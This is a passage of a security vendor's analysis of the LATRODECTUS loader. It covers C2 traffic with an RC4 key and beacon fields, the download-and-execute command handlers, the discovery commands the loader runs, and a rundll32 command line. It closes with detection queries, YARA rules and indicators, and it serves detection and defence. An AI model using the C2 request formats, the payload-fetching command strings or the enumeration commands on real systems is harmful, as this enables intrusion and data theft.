<p>Elastic Security Labs has seen this technique adopted in malware such as the <a href="https://chuongdong.com/reverse%20engineering/2022/01/06/RookRansomware/#anti-detection-alternate-data-streams">ROOK</a> ransomware family. The likely objective is to hinder incident response processes by interfering with collection and analysis. The compiled malware contains a <a href="https://github.com/LloydLabs/delete-self-poc/blob/49fe92218fdcfe8e173aa60a9eb307bae07cb027/main.h#L10">string</a> (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">:wtfbbq</code>) present in the repository.</p>
<p></p>
<p>This technique is observed at the start of the infection as well as when the malware performs an update using event handler #15. Elastic Security Labs has created a <a href="https://github.com/mandiant/capa-rules/blob/master/anti-analysis/anti-forensic/self-deletion/self-delete-using-alternate-data-streams.yml">CAPA rule</a> to help other organizations identify this behavior generically when analyzing various malware.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="communication" class="absolute -top-32"></span>Communication</h3>
<p>LATRODECTUS encrypts its requests using base64 and RC4 with a hardcoded password of <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">12345</code>. The first POST request over HTTPS that includes victim information along with configuration details, registering the infected system.</p>
<pre><code>POST https://aytobusesre.com/live/ HTTP/1.1
Accept: */*
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Tob 1.1)
Host: aytobusesre.com
Content-Length: 256
Cache-Control: no-cache

M1pNDFh7flKrBaDJqAPvJ98BTFDZdSDWDD8o3bMJbpmu0qdYv0FCZ0u6GtKSN0g//WHAS2npR/HDoLtIKBgkLwyrIh/3EJ+UR/0EKhYUzgm9K4DotfExUiX9FBy/HeV7C4PgPDigm55zCU7O9kSADMtviAodjuRBVW3DJ2Pf5+pGH9SG1VI8bdmZg+6GQFpcFTGjdWVcrORkxBjCGq3Eiv2svt3+ZFIN126PcvN95YJ0ie1Puljfs3wqsW455V7O</code></pre>
<p></p>
<p>Below is an example of the decrypted contents sent in the first request:</p>
<pre><code>counter=0&amp;type=1&amp;guid=249507485CA29F24F77B0F43D7BA&amp;os=6&amp;arch=1&amp;username=user&amp;group=510584660&amp;ver=1.1&amp;up=4&amp;direction=aytobusesre.com&amp;mac=00:0c:24:0e:29:85;&amp;computername=DESKTOP-3C4ILHO&amp;domain=-</code></pre>
<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th>Name</th><th>Description</th></tr></thead><tbody><tr><td>counter</td><td>Number of C2 requests increments by one for each callback</td></tr><tr><td>type</td><td>Type of request (registration, etc)</td></tr><tr><td>guid</td><td>Generated hardware ID seeded by volume serial number</td></tr><tr><td>os</td><td>Windows OS product version</td></tr><tr><td>arch</td><td>Windows architecture version</td></tr><tr><td>username</td><td>Username of infected machine</td></tr><tr><td>group</td><td>Campaign identifier seeded by unique string in binary with FNV</td></tr><tr><td>version</td><td>LATRODECTUS version</td></tr><tr><td>up</td><td>Unknown</td></tr><tr><td>direction</td><td>C2 domain</td></tr><tr><td>mac</td><td>MAC Address</td></tr><tr><td>computername</td><td>Hostname of infected machine</td></tr><tr><td>domain</td><td>Domain belonging to infected machine</td></tr></tbody></table></div>
<p>Each request is pipe-delimited by an object type, integer value, and corresponding argument. There are 4 object types which route the attacker controlled commands (<strong>CLEARURL</strong>, <strong>URLS</strong>, <strong>COMMAND</strong>, <strong>ERROR</strong>).</p>
<p></p>
<p>The main event handlers are passed through the <strong>COMMAND</strong> object type with the handler ID and their respective argument.</p>
<pre><code>COMMAND|12|http://www.meow123.com/test</code></pre>
<p>The <strong>CLEARURL</strong> object type is used to delete any configured domains. The <strong>URLS</strong> object type allows the attacker to swap to a new C2 URL. The last object type, <strong>ERROR</strong>, is not currently configured.</p>
<p></p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="bot-functionality" class="absolute -top-32"></span>Bot Functionality</h3>
<p>LATRODECTUS’s core functionality is driven through its command handlers. These handlers are used to collect information from the victim machine, provide execution capabilities as well as configure the implant. We have seen two additional handlers (retrieve processes, desktop listing) added since the initial <a href="https://medium.com/walmartglobaltech/icedid-gets-loaded-af073b7b6d39">publication</a> which may be a sign that the codebase is still active and changing.</p>
<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th>Command ID</th><th>Description</th></tr></thead><tbody><tr><td>2</td><td>Retrieve file listing from desktop directory</td></tr><tr><td>3</td><td>Retrieve process ancestry</td></tr><tr><td>4</td><td>Collect system information</td></tr><tr><td>12</td><td>Download and execute PE</td></tr><tr><td>13</td><td>Download and execute DLL</td></tr><tr><td>14</td><td>Download and execute shellcode</td></tr><tr><td>15</td><td>Perform update, restart</td></tr><tr><td>17</td><td>Terminate own process and threads</td></tr><tr><td>18</td><td>Download and execute ICEDID payload</td></tr><tr><td>19</td><td>Increase Beacon Timeout</td></tr><tr><td>20</td><td>Resets request counter</td></tr></tbody></table></div>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="desktop-listing---command-id-2" class="absolute -top-32"></span>Desktop listing - command ID (2)</h4>
<p>This command handler will retrieve a list of the contents of the user’s desktop, which the developer refers to as <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">desklinks</code>. This data will be encrypted and appended to the outbound beacon request. This is used for enumerating and validating victim environments quickly.</p>
<p></p>
<p><strong>Example request</strong>:</p>
<pre><code>counter=0&amp;type=1&amp;guid=249507485CA29F24F77B0F43D7BA&amp;os=6&amp;arch=1&amp;username=user&amp;group=510584660&amp;ver=1.1&amp;up=4&amp;direction=aytobusesre.com&amp;desklinks=[&quot;OneDrive.lnk&quot;,&quot;OneNote.lnk&quot;,&quot;PowerPoint.lnk&quot;,&quot;Notepad++.lnk&quot;,&quot;Excel.lnk&quot;,&quot;Google Chrome.lnk&quot;,&quot;Snipping Tool.lnk&quot;,&quot;Notepad.lnk&quot;,&quot;Paint.lnk&quot;]</code></pre>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="process-ancestry---command-id-3" class="absolute -top-32"></span>Process ancestry - command ID (3)</h4>
<p>This event handler is referenced as <strong>proclist</strong> by the developer where it collects the entire running process ancestry from the infected machine via the <strong>CreateToolhelp32Snapshot</strong> API.</p>
<p></p>
<p>Like security researchers, malware authors are interested in process parent/child relationships for decision-making. The authors of LATRODECTUS even collect information about process grandchildren, likely to validate different compromised environments.</p>
<p></p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="collect-system-information---command-id-4" class="absolute -top-32"></span>Collect system information - command ID (4)</h4>
<p>This command handler creates a new thread that runs the following system discovery/enumeration commands, each of which is a potential detection opportunity:</p>
<pre><code>C:\Windows\System32\cmd.exe /c ipconfig /all
C:\Windows\System32\cmd.exe /c systeminfo
C:\Windows\System32\cmd.exe /c nltest /domain_trusts
C:\Windows\System32\cmd.exe /c nltest /domain_trusts /all_trusts
C:\Windows\System32\cmd.exe /c net view /all /domain
C:\Windows\System32\cmd.exe /c net view /all
C:\Windows\System32\cmd.exe /c net group &quot;Domain Admins&quot; /domain
C:\Windows\System32\wbem\wmic.exe /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get * /Format:List
C:\Windows\System32\cmd.exe /c net config workstation
C:\Windows\System32\cmd.exe /c wmic.exe /node:localhost /namespace:\\root\SecurityCenter2 path AntiVirusProduct Get DisplayName | findstr /V /B /C:displayName || echo No Antivirus installed
C:\Windows\System32\cmd.exe /c whoami /groups</code></pre>
<p>Each output is placed into URI with corresponding collected data:</p>
<pre><code>&amp;ipconfig=
&amp;systeminfo=
&amp;domain_trusts=
&amp;domain_trusts_all=
&amp;net_view_all_domain=
&amp;net_view_all=
&amp;net_group=
&amp;wmic=
&amp;net_config_ws=
&amp;net_wmic_av=
&amp;whoami_group=</code></pre>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="download-and-execute-pe---command-id-12" class="absolute -top-32"></span>Download and execute PE - command ID (12)</h4>
<p>This handler downloads a PE file from the C2 server then writes the content to disk with a randomly generated file name, then executes the file.</p>
<p></p>
<p>Below is an example in our environment using this handler:</p>
<p></p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="download-and-execute-dll---command-id-13" class="absolute -top-32"></span>Download and execute DLL - command ID (13)</h4>
<p>This command handler downloads a DLL from C2 server, writes it to disk with a randomly generated file name, and executes the DLL using rundll32.exe.</p>
<p></p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="download-and-execute-shellcode---command-14" class="absolute -top-32"></span>Download and execute shellcode - command (14)</h4>
<p>This command handler downloads shellcode from the C2 server via <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">InternetReadFile</code>, allocates and copies the shellcode into memory then directly calls it with a new thread pointing at the shellcode.</p>
<p></p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="update--restart----command-id-15" class="absolute -top-32"></span>Update / restart  - command ID (15)</h4>
<p>This handler appears to perform a binary update to the malware where it’s downloaded, the existing thread/mutex is notified, and then released. The file is subsequently deleted and a new binary is downloaded/executed before terminating the existing process.</p>
<p></p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="terminate---command-id-17" class="absolute -top-32"></span>Terminate - command ID (17)</h4>
<p>This handler will terminate the existing LATRODECTUS process.</p>
<p></p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="download-and-execute-hosted-iceid-payload---command-id-18" class="absolute -top-32"></span>Download and execute hosted ICEID payload - command ID (18)</h4>
<p>This command handler downloads two ICEDID components from a LATRODECTUS server and executes them using a spawned <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">rundll32.exe</code> process. We haven’t personally observed this being used in-the-wild, however.</p>
<p>The handler creates a folder containing two files to the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">AppData\Roaming\</code> directory. These file paths and filenames are seeded by a custom random number generator which we will review in the next section. In our case, this new folder location is:</p>
<pre><code>C:\Users\REM\AppData\Roaming\-632116337</code></pre>
<p>It retrieves a file (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">test.dll</code>) from the C2 server, the standard ICEDID loader, which is written to disk with a randomly -generated file name (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">-456638727.dll</code>).</p>
<p></p>
<p>LATRODECTUS will then perform similar steps by generating a random filename for the ICEDID payload (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">1431684209.dat</code>). Before performing the download, it will set-up the arguments to properly load ICEDID. If you have run into ICEDID in the past, this part of the command-line should look familiar: it’s used to call the ICEDID export of the loader, while passing the relative path to the encrypted ICEDID payload file.</p>
<pre><code>init -zzzz=&quot;-632116337\1431684209.dat&quot;</code></pre>
<p></p>
<p>LATRODECUS initiates a second download request using a hard-coded URI (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/files/bp.dat</code>) from the configured C2 server, which is written to a file (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">1431684209.dat</code>). Analyzing the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">bp.dat</code> file, researchers identified it as a conventional encrypted ICEDID payload, commonly referenced as <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">license.dat</code>.</p>
<p></p>
<p>After decrypting the file, malware researchers noted a familiar 129 byte sequence of junk bytes prepended to the file followed by the custom section headers.</p>
<p></p>
<p>Our team was able to revisit <a href="https://www.elastic.co/security-labs/unpacking-icedid">prior tooling</a> and successfully decrypt this file, enabling us to rebuild the PE (ICEDID).</p>
<p></p>
<p>At this point, the ICEDID loader and encrypted payload have been downloaded to the same folder.</p>
<p></p>
<p>These files are then executed together using <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">rundll32.exe</code> via <strong>CreateProcessW</strong> with their respective arguments. Below is the observed command-line:</p>
<pre><code>rundll32.exe C:\Users\REM\AppData\Roaming\-632116337\-456638727.dll,init -zzzz=&quot;-632116337\1431684209.dat&quot;</code></pre>
<p></p>
<p>Scanning the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">rundll32.exe</code> child process spawned by LATRODECTUS with our ICEDID YARA rule also indicates the presence of the ICEDID.</p>
<p></p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="beacon-timeout---command-id-19" class="absolute -top-32"></span>Beacon timeout - command ID (19)</h4>
<p>LATRODECTUS supports jitter for beaconing to C2. This can make it harder for defenders to detect via network sources due to randomness this introduces to beaconing intervals.</p>
<p></p>
<p>In order to calculate the timeout, it generates a random number by seeding a combination of the user’s cursor position on the screen multiplied by the system’s uptime (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">GetTickCount</code>). This result is passed as a parameter to <strong>RtlRandomEx</strong>.</p>
<p></p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="reset-counter---command-id-20" class="absolute -top-32"></span>Reset counter - command ID (20)</h4>
<p>This command handler will reset the request counter that is passed on each communication request. For example, on the third callback it is filled with 3 here. With this function, the developer can reset the count starting from 0.</p>
<pre><code>counter=3&amp;type=4&amp;guid=638507385</code></pre>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="latrodectus--icedid-connection" class="absolute -top-32"></span>LATRODECTUS / ICEDID connection</h3>
<p>There definitely is some kind of development connection or working arrangement between ICEDID and LATRODECTUS. Below are some of the similarities observed:</p>
<ul>
<li>Same enumeration commands in the system discovery handler</li>
<li>The DLL exports all point to same export function address, this was a common observation with ICEDID payloads</li>
<li>C2 data is concatenated together as variables in the C2 traffic requests</li>
<li>The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">bp.dat</code> file downloaded from handler (#18) is used to execute the ICEDID payload via <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">rundll32.exe</code></li>
<li>The functions appear to be similarly coded</li>
</ul>
<p></p>
<p>Researchers didn’t conclude that there was a clear relationship between the ICEDID and LATRODECTUS families, though they appear at least superficially affiliated. ICEDID possesses more mature capabilities, like those used for data theft or the <a href="https://www.team-cymru.com/post/inside-the-icedid-backconnect-protocol">BackConnect</a> module, and has been richly documented over a period of several years. One hypothesis being considered is that LATRODECTUS is being actively developed as a replacement for ICEDID, and the handler (#18) was included until malware authors were satisfied with LATRODECTUS’ capabilities.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="sandboxing-latrodectus" class="absolute -top-32"></span>Sandboxing LATRODECTUS</h3>
<p>To evaluate LATRODECTUS detections, we set up a Flask server configured with the different handlers to instruct an infected machine to perform various actions in a sandbox environment. This method provides defenders with a great opportunity to assess the effectiveness of their detection and logging tools against every capability. Different payloads like shellcode/binaries can be exchanged as needed.</p>
<p></p>
<p>As an example, for the download and execution of a DLL (handler #13), we can provide the following request structure (object type, handler, arguments for handler) to the command dispatcher:</p>
<pre><code>COMMAND|13|http://www.meow123.com/dll, ShowMessage</code></pre>
<p>The following example depicts the RC4-encrypted string described earlier, which has been base64-encoded.</p>
<pre><code>E3p1L21QSBOqEKjYrBKiLNZJTk7KZn+HWn0p2LQfOLWCz/py4VkkAxSXXdnDd39p2EU=</code></pre>
<p>Using the following CyberChef recipe, analysts can generate encrypted command requests:</p>
<p></p>
<p>Using the actual malware codebase and executing these different handlers using a low-risk framework, defenders can get a glimpse into the events, alerts, and logs recorded by their security instrumentation.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="detecting-latrodectus" class="absolute -top-32"></span>Detecting LATRODECTUS</h2>
<p>The following Elastic Defend protection features trigger during the LATRODECTUS malware infection process:</p>
<p></p>
<p>Below are the prebuilt MITRE ATT&amp;CK-aligned rules with descriptions:</p>
<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th>ATT&amp;CK technique</th><th>Elastic Rule</th><th>Description</th></tr></thead><tbody><tr><td><a href="https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/execution_oversized_windows_script_execution.toml">T1059.007 - Javascript</a> <a href="https://attack.mitre.org/techniques/T1027/">T1027 - Obfuscated Files or Information</a></td><td><a href="https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/execution_oversized_windows_script_execution.toml">Suspicious Oversized Script Execution</a></td><td>LATRODECTUS is delivered via oversized Javascript files, on average more than 800KB filled with random text.</td></tr><tr><td><a href="https://attack.mitre.org/techniques/T1047/">T1047 - Windows Management Instrumentation</a></td><td><a href="https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/initial_access_execution_via_a_suspicious_wmi_client.toml">Execution via a Suspicious WMI Client</a></td><td>Javascript dropper invokes WMI to mount a WEBDAV share and invokes msiexec to install a remote msi file.</td></tr><tr><td><a href="https://attack.mitre.org/techniques/T1218/007/">T1218.007 - Misexec</a></td><td><a href="https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/defense_evasion_remote_file_execution_via_msiexec.toml">Remote File Execution via MSIEXEC</a> <a href="https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/defense_evasion_suspicious_msiexec_child_process.toml">Suspicious MsiExec Child Process</a></td><td>MSI file hosted on remote Webdav and executed in quiet mode. Once executed it drops a DLL and launches rundll32 to load it via the Advanced installer viewer.exe binary.</td></tr><tr><td><a href="https://attack.mitre.org/techniques/T1218/011/">T1218.011 - Rundll32</a></td><td><a href="https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/defense_evasion_rundll32_or_regsvr32_loaded_a_dll_from_unbacked_memory.toml">Rundll32 or Regsvr32 Loaded a DLL from Unbacked Memory</a></td><td>Rundll32 loads the LATRODECTUS DLL from AppData and starts code injection.</td></tr><tr><td><a href="https://attack.mitre.org/techniques/T1055/">T1055 - Process Injection</a></td><td><a href="https://www.elastic.co/guide/en/security/current/configure-endpoint-integration-policy.html#memory-protection">Memory Threat Detection Alert: Shellcode Injection</a> <a href="https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/defense_evasion_virtualprotect_api_call_from_an_unsigned_dll.toml">VirtualProtect API Call from an Unsigned DLL</a> <a href="https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/defense_evasion_shellcode_execution_from_low_reputation_module.toml">Shellcode Execution from Low Reputation Module</a> <a href="https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/defense_evasion_network_module_loaded_from_suspicious_unbacked_memory.toml">Network Module Loaded from Suspicious Unbacked Memory</a></td><td>Shellcode execution triggers 3 endpoint behavior alerts and a memory threat detection alert.</td></tr><tr><td><a href="https://attack.mitre.org/techniques/T1053/005/">T1053.005 - Scheduled Task</a></td><td><a href="https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/persistence_scheduled_task_creation_by_an_unusual_process.toml">Scheduled Task Creation by an Unusual Process</a></td><td>LATRODECTUS may persist using scheduled tasks (rundll32 will create a scheduled task).</td></tr><tr><td><a href="https://attack.mitre.org/techniques/T1070/004/">T1070.004 - File Deletion</a></td><td><a href="https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/defense_evasion_potential_self_deletion_of_a_running_executable.toml">Potential Self Deletion of a Running Executable</a></td><td>Part of the malware DLL self update command and also when the DLL is not running from AppData, LATRODECTUS will delete itself while running and restart from the new path or running an updated version of itself leveraging <a href="https://github.com/LloydLabs/delete-self-poc">this technique</a>.</td></tr><tr><td><a href="https://attack.mitre.org/techniques/T1059/003/">T1059.003 - Windows Command Shell</a></td><td><a href="https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/execution_command_shell_activity_started_via_rundll32.toml">Command Shell Activity Started via RunDLL32</a></td><td>LATRODECTUS Command ID (4) - Collect system information via a series of cmd.exe execution.</td></tr></tbody></table></div>
<p>The following list of hunts and detection queries can be used to detect LATRODECTUS post-exploitation commands focused on execution:</p>
<p><strong>Rundll32 Download PE/DLL</strong> (command handlers #12, #13 and #18):</p>
<pre><code>sequence by process.entity_id with maxspan=1s
[file where event.action == &quot;creation&quot; and process.name : &quot;rundll32.exe&quot; and 
 /* PE file header dropped to the InetCache folder */
file.Ext.header_bytes : &quot;4d5a*&quot; and file.path : &quot;?:\\Users\\*\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\*&quot;]
[network where process.name : &quot;rundll32.exe&quot; and 
   event.action : (&quot;disconnect_received&quot;, &quot;connection_attempted&quot;) and 
   /* network disconnect activity to a public Ip address */
   not cidrmatch(destination.ip, &quot;10.0.0.0/8&quot;, &quot;127.0.0.0/8&quot;, &quot;169.254.0.0/16&quot;, &quot;172.16.0.0/12&quot;, &quot;192.0.0.0/24&quot;, &quot;192.0.0.0/29&quot;, &quot;192.0.0.8/32&quot;, &quot;192.0.0.9/32&quot;, &quot;192.0.0.10/32&quot;, &quot;192.0.0.170/32&quot;, &quot;192.0.0.171/32&quot;, &quot;192.0.2.0/24&quot;, &quot;192.31.196.0/24&quot;, &quot;192.52.193.0/24&quot;, &quot;192.88.99.0/24&quot;, &quot;224.0.0.0/4&quot;, &quot;100.64.0.0/10&quot;, &quot;192.175.48.0/24&quot;,&quot;198.18.0.0/15&quot;, &quot;198.51.100.0/24&quot;, &quot;203.0.113.0/24&quot;, &quot;240.0.0.0/4&quot;, &quot;::1&quot;, &quot;FE80::/10&quot;, &quot;FF00::/8&quot;, &quot;192.168.0.0/16&quot;)]</code></pre>
<p></p>
<p>Below is an ES|QL hunt to look for long-term and/or high count of network connections by rundll32 to a public IP address (which is uncommon):</p>
<pre><code>from logs-endpoint.events.network-*
| where host.os.family == &quot;windows&quot; and event.category == &quot;network&quot; and
 network.direction == &quot;egress&quot; and process.name == &quot;rundll32.exe&quot; and
/* excluding private IP ranges */
 not CIDR_MATCH(destination.ip, &quot;10.0.0.0/8&quot;, &quot;127.0.0.0/8&quot;, &quot;169.254.0.0/16&quot;, &quot;172.16.0.0/12&quot;, &quot;192.0.0.0/24&quot;, &quot;192.0.0.0/29&quot;, &quot;192.0.0.8/32&quot;, &quot;192.0.0.9/32&quot;, &quot;192.0.0.10/32&quot;, &quot;192.0.0.170/32&quot;, &quot;192.0.0.171/32&quot;, &quot;192.0.2.0/24&quot;, &quot;192.31.196.0/24&quot;, &quot;192.52.193.0/24&quot;, &quot;192.168.0.0/16&quot;, &quot;192.88.99.0/24&quot;, &quot;224.0.0.0/4&quot;, &quot;100.64.0.0/10&quot;, &quot;192.175.48.0/24&quot;,&quot;198.18.0.0/15&quot;, &quot;198.51.100.0/24&quot;, &quot;203.0.113.0/24&quot;, &quot;240.0.0.0/4&quot;, &quot;::1&quot;,&quot;FE80::/10&quot;, &quot;FF00::/8&quot;)
| keep source.bytes, destination.address, process.name, process.entity_id, process.pid, @timestamp, host.name
/* calc total duration and the number of connections per hour */
| stats count_connections = count(*), start_time = min(@timestamp), end_time = max(@timestamp) by process.entity_id, process.pid, destination.address, process.name, host.name
| eval duration = TO_DOUBLE(end_time)-TO_DOUBLE(start_time), duration_hours=TO_INT(duration/3600000), number_of_con_per_hour = (count_connections / duration_hours)
| keep host.name, destination.address, process.name, process.pid, duration, duration_hours, number_of_con_per_hour, count_connections
| where count_connections &gt;= 100</code></pre>
<p></p>
<p>Below is a screenshot of Elastic Defend triggering on the LATRODECTUS <a href="https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_Latrodectus.yar">memory signature</a>:</p>
<p></p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="yara" class="absolute -top-32"></span>YARA</h3>
<p>Elastic Security has created YARA rules to identify <a href="https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_Latrodectus.yar">LATRODECTUS</a>:</p>
<pre><code>rule Windows_Trojan_LATRODECTUS_841ff697 {
    meta:
        author = &quot;Elastic Security&quot;
        creation_date = &quot;2024-03-13&quot;
        last_modified = &quot;2024-04-05&quot;
        license = &quot;Elastic License v2&quot;
         os = &quot;Windows&quot;
        arch = &quot;x86&quot;
        threat_name = &quot;Windows.Trojan.LATRODECTUS&quot;
        reference_sample = &quot;aee22a35cbdac3f16c3ed742c0b1bfe9739a13469cf43b36fb2c63565111028c&quot;


    strings:
        $Str1 = { 48 83 EC 38 C6 44 24 20 73 C6 44 24 21 63 C6 44 24 22 75 C6 44 24 23 62 C6 44 24 24 }
        $crc32_loadlibrary = { 48 89 44 24 40 EB 02 EB 90 48 8B 4C 24 20 E8 ?? ?? FF FF 48 8B 44 24 40 48 81 C4 E8 02 00 00 C3 }
        $delete_self = { 44 24 68 BA 03 00 00 00 48 8B 4C 24 48 FF 15 ED D1 00 00 85 C0 75 14 48 8B 4C 24 50 E8 ?? ?? 00 00 B8 FF FF FF FF E9 A6 00 }
        $Str4 = { 89 44 24 44 EB 1F C7 44 24 20 00 00 00 00 45 33 C9 45 33 C0 33 D2 48 8B 4C 24 48 FF 15 7E BB 00 00 89 44 24 44 83 7C 24 44 00 75 02 EB 11 48 8B 44 24 48 EB 0C 33 C0 85 C0 0F 85 10 FE FF FF 33 }
        $handler_check = { 83 BC 24 D8 01 00 00 12 74 36 83 BC 24 D8 01 00 00 0E 74 2C 83 BC 24 D8 01 00 00 0C 74 22 83 BC 24 D8 01 00 00 0D 74 18 83 BC 24 D8 01 00 00 0F 74 0E 83 BC 24 D8 01 00 00 04 0F 85 44 02 00 00 }
        $hwid_calc = { 48 89 4C 24 08 48 8B 44 24 08 69 00 0D 66 19 00 48 8B 4C 24 08 89 01 48 8B 44 24 08 8B 00 C3 }
        $string_decrypt = { 89 44 24 ?? 48 8B 44 24 ?? 0F B7 40 ?? 8B 4C 24 ?? 33 C8 8B C1 66 89 44 24 ?? 48 8B 44 24 ?? 48 83 C0 ?? 48 89 44 24 ?? 33 C0 66 89 44 24 ?? EB ?? }
        $campaign_fnv = { 48 03 C8 48 8B C1 48 39 44 24 08 73 1E 48 8B 44 24 08 0F BE 00 8B 0C 24 33 C8 8B C1 89 04 24 69 04 24 93 01 00 01 89 04 24 EB BE }
    condition:
        2 of them
}</code></pre>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="observations" class="absolute -top-32"></span>Observations</h2>
<p>The following observables were discussed in this research.</p>
<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th>Observable</th><th>Type</th><th>Name</th><th>Reference</th></tr></thead><tbody><tr><td>aee22a35cbdac3f16c3ed742c0b1bfe9739a13469cf43b36fb2c63565111028c</td><td>SHA-256</td><td>TRUFOS.DLL</td><td>LATRODECTUS</td></tr><tr><td>aytobusesre.com</td><td>domain</td><td></td><td>LATRODECTUS C2</td></tr><tr><td>scifimond.com</td><td>domain</td><td></td><td>LATRODECTUS C2</td></tr><tr><td>gyxplonto.com</td><td>domain</td><td></td><td>ICEDID C2</td></tr><tr><td>neaachar.com</td><td>domain</td><td></td><td>ICEDID C2</td></tr></tbody></table></div>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="references" class="absolute -top-32"></span>References</h2>
<p>The following were referenced throughout the above research:</p>
<ul>
<li><a href="https://medium.com/walmartglobaltech/icedid-gets-loaded-af073b7b6d39">https://medium.com/walmartglobaltech/icedid-gets-loaded-af073b7b6d39</a></li>
<li><a href="https://www.proofpoint.com/us/blog/threat-insight/latrodectus-spider-bytes-ice">https://www.proofpoint.com/us/blog/threat-insight/latrodectus-spider-bytes-ice</a></li>
</ul>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="tooling" class="absolute -top-32"></span>Tooling</h2>
